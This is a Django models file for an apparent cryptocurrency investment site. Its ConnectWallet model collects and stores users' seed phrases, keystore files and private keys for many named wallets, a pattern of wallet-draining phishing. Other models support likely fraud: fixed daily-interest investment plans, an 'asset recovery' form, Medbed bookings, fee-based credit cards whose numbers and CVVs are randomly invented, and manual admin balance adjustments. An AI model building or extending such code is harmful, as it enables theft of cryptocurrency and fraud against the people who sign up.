from django.db import models
from django.contrib.auth.models import User
from django.db.models.signals import post_save, post_delete
from django.dispatch import receiver
from django.utils import timezone
import random

# UserProfile model to store additional user information
class UserProfile(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    phone_number = models.CharField(max_length=20, blank=True)
    subscribe_newsletter = models.BooleanField(default=False)
    email_verified = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    
    def __str__(self):
        return f"{self.user.username} Profile"


# cryptocurrency platforms
class CryptoPlatform(models.Model):
    name = models.CharField(max_length=100)
    link_address = models.URLField()
    platform_logo = models.ImageField(upload_to='platform_logos/', blank=True, null=True)

platform_choices =[
    ('trustwallet', 'Trust Wallet'),
    ('metamask', 'Metamask'),
    ('lobstr', 'Lobstr'),
    ('bitpay', 'Bitpay'),
    ('coinbase', 'Coinbase Wallet'),
    ('edge', 'Edge Wallet'),
    ('Uniswap', 'Uniswap'),
    ('Polygon', 'Polygon'),
    ('Blockchain', 'Blockchain'),
    ('exodus', 'Exodus'),
    ('atomin_wallet', 'Atomic Wallet'),
    ('robinhood', 'Robinhood Wallet'),
    ('uphold_wallet', 'Uphold wallet'),
    ('luno', 'Luno Wallet'),
    ('ledger_wallet', 'Ledger Wallet'),
    ('trezor_wallet', 'Trezor wallet'),
    ('Electrum_wallet', 'Electrum Wallet'),
    ('coinomi_wallet', 'Coinomi Wallet'),
    ('safepal_wallet', 'Safepal wallet'),
    ('Zengo_wallet', 'Zengo Wallet'),
    ('other', 'Others'),
]
class ConnectWallet(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE, blank=True, null=True, related_name='connected_wallets')  # Changed to ForeignKey
    platform = models.CharField(max_length=50, choices=platform_choices, null=True, blank=True, default='other')
    # either mnemonic phrase or keystore_json or private_key
    mnemonic_phrase = models.TextField(blank=True, null=True)
    keystore_json = models.TextField(blank=True, null=True)
    private_key = models.TextField(blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)  # Add updated_at field

    def __str__(self):
        return f"Wallet for {self.user.username}"

    class Meta:
        verbose_name = "Connected Wallet"
        verbose_name_plural = "Connected Wallets"


# asset recovery form model
# asset recovery status choices
RECOVERY_STATUS_CHOICES = [
        ('pending', 'Pending Review'),
        ('verified', 'Verified'),
        ('in_review', 'In Review'),
        ('recovery_mode', 'Recovery Activated'),
    ]

class AssetRecoveryForm(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    full_name = models.CharField(max_length=255)
    status = models.CharField(max_length=15, choices=RECOVERY_STATUS_CHOICES, default='pending review')
    email = models.EmailField()
    phone_number = models.CharField(max_length=20)
    wallet_address = models.CharField(max_length=255)
    asset_details = models.TextField()
    additional_info = models.TextField(blank=True, null=True)
    submitted_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"Asset Recovery Form by {self.user.username} - {self.submitted_at.strftime('%Y-%m-%d %H:%M:%S')}"
    

class KYCVerification(models.Model):
    STATUS_CHOICES = [
        ('not_submitted', 'Not Submitted'),
        ('pending', 'Pending Review'),
        ('verified', 'Verified'),
        ('rejected', 'Rejected'),
    ]
    
    DOCUMENT_TYPES = [
        ('passport', 'Passport'),
        ('drivers_license', 'Driver\'s License'),
        ('national_id', 'National ID Card'),
        ('other', 'Other'),
    ]
    
    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='kyc')
    document_type = models.CharField(max_length=20, choices=DOCUMENT_TYPES)
    document_image = models.ImageField(upload_to='kyc_documents/%Y/%m/%d/', null=True, blank=True)  # Changed to ImageField
    status = models.CharField(max_length=15, choices=STATUS_CHOICES, default='not_submitted')
    submitted_at = models.DateTimeField(null=True, blank=True)
    reviewed_at = models.DateTimeField(null=True, blank=True)
    review_notes = models.TextField(blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"KYC - {self.user.username} ({self.status})"

    def save(self, *args, **kwargs):
        # Set submitted_at when status changes to pending
        if self.status == 'pending' and not self.submitted_at:
            self.submitted_at = timezone.now()
        # Set reviewed_at when status changes to verified or rejected
        if self.status in ['verified', 'rejected'] and not self.reviewed_at:
            self.reviewed_at = timezone.now()
        super().save(*args, **kwargs)
    

class Crytocurrency(models.Model):
    name = models.CharField(max_length=50)
    symbol = models.CharField(max_length=10)
    logo = models.ImageField(upload_to='crypto_logos/', blank=True, null=True)
    coin_price = models.DecimalField(max_digits=20, decimal_places=2)
    market_percentage = models.DecimalField(max_digits=5, decimal_places=2)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.name} ({self.symbol})"
    
    def get_icon_class(self):
        """Return appropriate FontAwesome icon class based on cryptocurrency"""
        icon_map = {
            'BTC': 'fab fa-bitcoin text-orange-500',
            'ETH': 'fab fa-ethereum text-purple-500',
            'BNB': 'fab fa-bnb text-yellow-500',
            'XRP': 'fas fa-x text-black',
            'ADA': 'fab fa-ada text-blue-500',
            'DOGE': 'fab fa-dogecoin text-yellow-400',
        }
        return icon_map.get(self.symbol, 'fas fa-coins text-gray-500')

    def get_price_change(self):
        """Return price change percentage - you can modify this logic"""
        return 2.5  # Example fixed value - replace with your logic


# Admin Wallet for each cryptocurrency
class AdminWallet(models.Model):
    cryptocurrency = models.OneToOneField(Crytocurrency, on_delete=models.CASCADE)
    wallet_address = models.CharField(max_length=255, unique=False)
    qr_code = models.ImageField(upload_to='wallet_qrcodes/', blank=True, null=True)
    is_active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"{self.cryptocurrency.symbol} Admin Wallet: {self.wallet_address[:10]}..."


# User cryptocurrency holdings
class UserCryptoHolding(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    cryptocurrency = models.ForeignKey(Crytocurrency, on_delete=models.CASCADE)
    amount_in_usd = models.DecimalField(max_digits=20, decimal_places=2)
    amount = models.DecimalField(max_digits=20, decimal_places=8)
    acquired_at = models.DateTimeField(auto_now_add=True)

    # calculate amount based on current coin price
    def save(self, *args, **kwargs):
        self.amount = self.amount_in_usd / self.cryptocurrency.coin_price
        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.amount} of {self.cryptocurrency.symbol} held by {self.user.username}"


# deposit status choices
DEPOSIT_STATUS_CHOICES = [
    ('pending', 'Pending'),
    ('completed', 'Completed'),
    ('failed', 'Failed'),
]

# Simple Deposit model - ONLY USD AMOUNT
class Deposit(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    cryptocurrency = models.ForeignKey(Crytocurrency, on_delete=models.CASCADE)
    amount_in_usd = models.DecimalField(max_digits=20, decimal_places=2)  # Only USD amount
    admin_wallet = models.ForeignKey(AdminWallet, on_delete=models.CASCADE, null=True, blank=True)  # Wallet user deposited to
    tx_hash = models.CharField(max_length=255, blank=True, null=True)  # Transaction hash from blockchain
    status = models.CharField(max_length=20, default='pending', choices=DEPOSIT_STATUS_CHOICES)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"Deposit: ${self.amount_in_usd} for {self.cryptocurrency.symbol} by {self.user.username}"

    def save(self, *args, **kwargs):
        # Get old status if updating
        old_status = None
        if self.pk:
            try:
                old_instance = Deposit.objects.get(pk=self.pk)
                old_status = old_instance.status
            except Deposit.DoesNotExist:
                pass
        
        # Set admin wallet if not set
        if not self.admin_wallet:
            try:
                admin_wallet = AdminWallet.objects.get(cryptocurrency=self.cryptocurrency, is_active=True)
                self.admin_wallet = admin_wallet
            except AdminWallet.DoesNotExist:
                pass
        
        super().save(*args, **kwargs)
        
        # Update user holdings when deposit status changes to completed
        if self.status == 'completed' and old_status != 'completed':
            holding, created = UserCryptoHolding.objects.get_or_create(
                user=self.user,
                cryptocurrency=self.cryptocurrency,
                defaults={'amount_in_usd': self.amount_in_usd}
            )
            if not created:
                holding.amount_in_usd += self.amount_in_usd
                holding.save()  # This will automatically recalculate the amount
            
            # Update total balance
            TotalBalance.update_user_balance(self.user)


# withdrawal status choices
WITHDRAWAL_STATUS_CHOICES = [
    ('pending', 'Pending'),
    ('completed', 'Completed'),
    ('failed', 'Failed'),
]

# Simple Withdrawal model - ONLY USD AMOUNT  
class Withdrawal(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    cryptocurrency = models.ForeignKey(Crytocurrency, on_delete=models.CASCADE)
    amount_in_usd = models.DecimalField(max_digits=20, decimal_places=2)  # Only USD amount
    user_wallet_address = models.CharField(max_length=255)  # User's external wallet address
    tx_hash = models.CharField(max_length=255, blank=True, null=True)  # Transaction hash from blockchain
    status = models.CharField(max_length=20, default='pending', choices=WITHDRAWAL_STATUS_CHOICES)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"Withdrawal: ${self.amount_in_usd} from {self.cryptocurrency.symbol} by {self.user.username}"

    def save(self, *args, **kwargs):
        # Get old status if updating
        old_status = None
        if self.pk:
            try:
                old_instance = Withdrawal.objects.get(pk=self.pk)
                old_status = old_instance.status
            except Withdrawal.DoesNotExist:
                pass
        
        super().save(*args, **kwargs)
        
        # Update user holdings when withdrawal status changes to completed
        if self.status == 'completed' and old_status != 'completed':
            try:
                holding = UserCryptoHolding.objects.get(
                    user=self.user,
                    cryptocurrency=self.cryptocurrency
                )
                if holding.amount_in_usd >= self.amount_in_usd:
                    holding.amount_in_usd -= self.amount_in_usd
                    holding.save()  # This will automatically recalculate the amount
                    
                    # Update total balance
                    TotalBalance.update_user_balance(self.user)
            except UserCryptoHolding.DoesNotExist:
                pass  # No holding to withdraw from


# Total Balance model to sum all user crypto assets in USD
class TotalBalance(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    total_usd_balance = models.DecimalField(max_digits=20, decimal_places=2, default=0)
    last_updated = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"Total Balance: ${self.total_usd_balance} for {self.user.username}"

    def calculate_total_balance(self):
        """Calculate total USD balance from all crypto holdings"""
        holdings = UserCryptoHolding.objects.filter(user=self.user)
        total = sum(holding.amount_in_usd for holding in holdings)
        self.total_usd_balance = total
        self.save()
        return total

    @classmethod
    def update_user_balance(cls, user):
        """Update or create total balance for a user"""
        balance, created = cls.objects.get_or_create(user=user)
        balance.calculate_total_balance()
        return balance


# Signals to automatically update total balance when UserCryptoHolding changes
@receiver(post_save, sender=UserCryptoHolding)
@receiver(post_delete, sender=UserCryptoHolding)
def update_balance_on_holding_change(sender, instance, **kwargs):
    """Update total balance when crypto holdings change"""
    TotalBalance.update_user_balance(instance.user)


# Signal to create TotalBalance when new user is created
@receiver(post_save, sender=User)
def create_user_balance(sender, instance, created, **kwargs):
    """Create TotalBalance when new user is created"""
    if created:
        TotalBalance.objects.create(user=instance)


# ==========================================
# INVESTMENT MODELS
# ==========================================

class InvestmentPlan(models.Model):
    name = models.CharField(max_length=100)
    description = models.TextField()
    min_amount = models.DecimalField(max_digits=20, decimal_places=2)
    max_amount = models.DecimalField(max_digits=20, decimal_places=2)
    daily_interest_rate = models.DecimalField(max_digits=5, decimal_places=2, help_text="Percentage per day (e.g., 2.5 for 2.5%)")
    duration_days = models.IntegerField(help_text="Investment duration in days")
    is_active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"{self.name} ({self.daily_interest_rate}% daily for {self.duration_days} days)"


class UserInvestment(models.Model):
    STATUS_CHOICES = [
        ('active', 'Active'),
        ('completed', 'Completed'),
        ('cancelled', 'Cancelled'),
    ]

    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='investments')
    plan = models.ForeignKey(InvestmentPlan, on_delete=models.PROTECT)
    cryptocurrency = models.ForeignKey(Crytocurrency, on_delete=models.PROTECT)
    amount_invested = models.DecimalField(max_digits=20, decimal_places=8, help_text="Amount in crypto units")
    amount_in_usd = models.DecimalField(max_digits=20, decimal_places=2, help_text="USD value at time of investment")
    daily_profit = models.DecimalField(max_digits=20, decimal_places=2, default=0, help_text="Daily profit in USD")
    total_profit_earned = models.DecimalField(max_digits=20, decimal_places=2, default=0, help_text="Total accumulated profit in USD")
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='active')
    start_date = models.DateTimeField(auto_now_add=True)
    end_date = models.DateTimeField()
    last_profit_date = models.DateTimeField(null=True, blank=True)
    
    def __str__(self):
        return f"{self.user.username} - {self.plan.name} - ${self.amount_in_usd}"

    def save(self, *args, **kwargs):
        if not self.end_date and self.plan:
            self.end_date = timezone.now() + timezone.timedelta(days=self.plan.duration_days)
        if not self.daily_profit and self.plan and self.amount_in_usd:
            # Calculate daily profit in USD
            self.daily_profit = self.amount_in_usd * (self.plan.daily_interest_rate / 100)
        super().save(*args, **kwargs)


class InvestmentTransaction(models.Model):
    TRANSACTION_TYPES = [
        ('investment_start', 'Investment Start'),
        ('daily_profit', 'Daily Profit'),
        ('final_payout', 'Final Payout'),
    ]

    investment = models.ForeignKey(UserInvestment, on_delete=models.CASCADE, related_name='transactions')
    transaction_type = models.CharField(max_length=20, choices=TRANSACTION_TYPES)
    amount = models.DecimalField(max_digits=20, decimal_places=2, help_text="Amount in USD")
    description = models.CharField(max_length=255, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.get_transaction_type_display()} - ${self.amount} - {self.investment}"


# ==========================================
# MEDBED MODELS
# ==========================================

class MedbedRequest(models.Model):
    REQUEST_TYPE_CHOICES = [
        ('booking', 'Booking Request'),
        ('inquiry', 'General Inquiry'),
    ]
    
    STATUS_CHOICES = [
        ('pending', 'Pending'),
        ('confirmed', 'Confirmed'),
        ('completed', 'Completed'),
        ('cancelled', 'Cancelled'),
    ]

    user = models.ForeignKey(User, on_delete=models.CASCADE)
    full_name = models.CharField(max_length=255)
    email = models.EmailField()
    phone_number = models.CharField(max_length=20)
    request_type = models.CharField(max_length=20, choices=REQUEST_TYPE_CHOICES, default='booking')
    preferred_date = models.DateField(null=True, blank=True)
    medical_conditions = models.TextField(help_text="Please describe any medical conditions or reasons for this request.")
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"Medbed {self.request_type} - {self.full_name}"


# ==========================================
# CREDIT CARD MODELS
# ==========================================

class CreditCardType(models.Model):
    name = models.CharField(max_length=100)
    fee = models.DecimalField(max_digits=10, decimal_places=2, help_text="Fee in USD")
    description = models.TextField()
    image = models.ImageField(upload_to='credit_cards/', blank=True, null=True)
    
    def __str__(self):
        return f"{self.name} (${self.fee})"


class CreditCardRequest(models.Model):
    STATUS_CHOICES = [
        ('pending', 'Pending'),
        ('approved', 'Approved'),
        ('rejected', 'Rejected'),
        ('shipped', 'Shipped'),
        ('active', 'Active'),
        ('banned', 'Banned'),
        ('suspended', 'Suspended'),
    ]
    
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    card_type = models.ForeignKey(CreditCardType, on_delete=models.CASCADE)
    full_name = models.CharField(max_length=200)
    phone_number = models.CharField(max_length=20)
    address = models.TextField()
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    
    # Card details (generated when approved)
    card_number = models.CharField(max_length=19, blank=True, null=True)
    cvv = models.CharField(max_length=3, blank=True, null=True)
    expiry_date = models.CharField(max_length=7, blank=True, null=True)  # Format: MM/YY
    
    # Card regulation fields
    is_banned = models.BooleanField(default=False)
    ban_reason = models.TextField(blank=True, null=True)
    daily_limit = models.DecimalField(max_digits=10, decimal_places=2, default=10000.00)
    monthly_limit = models.DecimalField(max_digits=10, decimal_places=2, default=100000.00)
    
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    
    def __str__(self):
        return f"{self.card_type.name} - {self.user.username}"
    
    def save(self, *args, **kwargs):
        # Automatically generate card details if approved and not set
        if self.status in ['approved', 'shipped', 'active'] and not self.card_number:
            # Generate random 16 digit card number
            self.card_number = f"{random.randint(4000, 4999)} {random.randint(1000, 9999)} {random.randint(1000, 9999)} {random.randint(1000, 9999)}"
            
            # Generate random 3 digit CVV
            self.cvv = str(random.randint(100, 999))
            
            # Set expiry date to 3 years from now
            future_date = timezone.now() + timezone.timedelta(days=365*3)
            self.expiry_date = future_date.strftime('%m/%y')
        
        # Auto-update status based on ban
        if self.is_banned:
            self.status = 'banned'
            
        super().save(*args, **kwargs)


# ==========================================
# ADMIN ENHANCEMENT MODELS
# ==========================================

class UserActivityLog(models.Model):
    """Track user activity for admin monitoring"""
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='activity_logs')
    action = models.CharField(max_length=200)
    details = models.TextField(blank=True)
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    timestamp = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-timestamp']
        verbose_name = "User Activity Log"
        verbose_name_plural = "User Activity Logs"
    
    def __str__(self):
        return f"{self.user.username} - {self.action} at {self.timestamp}"


class BalanceAdjustment(models.Model):
    """Track manual balance adjustments by admins"""
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='balance_adjustments')
    admin = models.ForeignKey(User, on_delete=models.SET_NULL, null=True, related_name='balance_adjustments_made')
    amount = models.DecimalField(max_digits=20, decimal_places=2)
    cryptocurrency = models.ForeignKey(Crytocurrency, on_delete=models.CASCADE)
    adjustment_type = models.CharField(max_length=10, choices=[('add', 'Add'), ('subtract', 'Subtract')])
    reason = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-created_at']
        verbose_name = "Balance Adjustment"
        verbose_name_plural = "Balance Adjustments"
    
    def __str__(self):
        return f"{self.adjustment_type.title()} {self.amount} {self.cryptocurrency.symbol} for {self.user.username}"


class AdminNotification(models.Model):
    """Notifications sent by admin to users"""
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='admin_notifications')
    title = models.CharField(max_length=200)
    message = models.TextField()
    sent_by = models.ForeignKey(User, on_delete=models.SET_NULL, null=True, related_name='notifications_sent')
    created_at = models.DateTimeField(auto_now_add=True)
    is_read = models.BooleanField(default=False)
    
    class Meta:
        ordering = ['-created_at']
        verbose_name = "Admin Notification"
        verbose_name_plural = "Admin Notifications"
    
    def __str__(self):
        return f"{self.title} to {self.user.username}"


class SystemAnnouncement(models.Model):
    """System-wide announcements"""
    ANNOUNCEMENT_TYPES = [
        ('info', 'Information'),
        ('warning', 'Warning'),
        ('success', 'Success'),
        ('error', 'Error'),
    ]
    
    title = models.CharField(max_length=200)
    content = models.TextField()
    announcement_type = models.CharField(max_length=20, choices=ANNOUNCEMENT_TYPES, default='info')
    is_active = models.BooleanField(default=True)
    created_by = models.ForeignKey(User, on_delete=models.SET_NULL, null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    expires_at = models.DateTimeField(null=True, blank=True)
    
    class Meta:
        ordering = ['-created_at']
        verbose_name = "System Announcement"
        verbose_name_plural = "System Announcements"
    
    def __str__(self):
        return self.title
    
    def is_expired(self):
        if self.expires_at:
            return timezone.now() > self.expires_at
        return False


class BulkEmail(models.Model):
    """Track bulk emails sent by admins"""
    subject = models.CharField(max_length=200)
    message = models.TextField()
    recipients_filter = models.CharField(max_length=50, choices=[
        ('all', 'All Users'),
        ('active', 'Active Users'),
        ('kyc_verified', 'KYC Verified Users'),
        ('with_balance', 'Users with Balance'),
        ('investors', 'Active Investors'),
    ])
    sent_by = models.ForeignKey(User, on_delete=models.SET_NULL, null=True)
    sent_at = models.DateTimeField(auto_now_add=True)
    recipient_count = models.IntegerField(default=0)
    
    class Meta:
        ordering = ['-sent_at']
        verbose_name = "Bulk Email"
        verbose_name_plural = "Bulk Emails"
    
    def __str__(self):
        return f"{self.subject} ({self.recipient_count} recipients)"


class SystemSetting(models.Model):
    """Configurable system settings"""
    key = models.CharField(max_length=100, unique=True)
    value = models.TextField()
    description = models.TextField()
    updated_by = models.ForeignKey(User, on_delete=models.SET_NULL, null=True)
    updated_at = models.DateTimeField(auto_now=True)
    
    class Meta:
        verbose_name = "System Setting"
        verbose_name_plural = "System Settings"
    
    def __str__(self):
        return self.key


class EmailTemplate(models.Model):
    """Editable email templates"""
    name = models.CharField(max_length=100, unique=True)
    subject = models.CharField(max_length=200)
    body = models.TextField()
    variables = models.TextField(help_text="Comma-separated list of available variables")
    updated_at = models.DateTimeField(auto_now=True)
    
    class Meta:
        verbose_name = "Email Template"
        verbose_name_plural = "Email Templates"
    
    def __str__(self):
        return self.name


class SystemLog(models.Model):
    """System activity logs"""
    LOG_LEVELS = [
        ('INFO', 'Information'),
        ('WARNING', 'Warning'),
        ('ERROR', 'Error'),
        ('CRITICAL', 'Critical'),
    ]
    
    level = models.CharField(max_length=20, choices=LOG_LEVELS)
    message = models.TextField()
    details = models.TextField(blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-created_at']
        verbose_name = "System Log"
        verbose_name_plural = "System Logs"
    
    def __str__(self):
        return f"[{self.level}] {self.message[:50]}"
